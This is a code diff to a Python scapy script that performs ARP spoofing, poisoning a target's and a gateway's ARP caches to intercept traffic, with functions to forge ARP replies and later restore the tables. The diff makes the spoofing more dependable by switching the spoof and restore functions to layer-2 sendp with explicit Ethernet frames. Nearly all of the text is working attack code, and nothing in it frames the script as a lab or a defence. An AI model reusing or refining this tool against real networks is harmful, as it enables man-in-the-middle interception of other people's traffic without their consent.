@@ -1,4 +1,4 @@
-from scapy.all import Ether, ARP, srp, send, conf
+from scapy.all import Ether, ARP, srp, sendp, conf
 import argparse
 import time
 import sys
@@ -17,19 +17,24 @@ args = parser.parse_args()
 ip_target, ip_gateway, ip_routing = args.target, args.gateway, args.routing
 
 def get_mac(ip):
-    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
+    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
     if ans:
         return ans[0][1].src
 
 def spoof(target_ip, spoof_ip):
-    packet = ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
-    send(packet, verbose=False)
+    target_mac = get_mac(target_ip)
+    ether = Ether(dst=target_mac)
+    arp = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    packet = ether/arp
+    sendp(packet, verbose=False)
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
-    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    send(packet, verbose=False, count=7)
+    ether = Ether(dst=destination_mac)
+    arp = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    packet = ether/arp
+    sendp(packet, verbose=False, count=7)
 
 packets_sent = 0
 try:
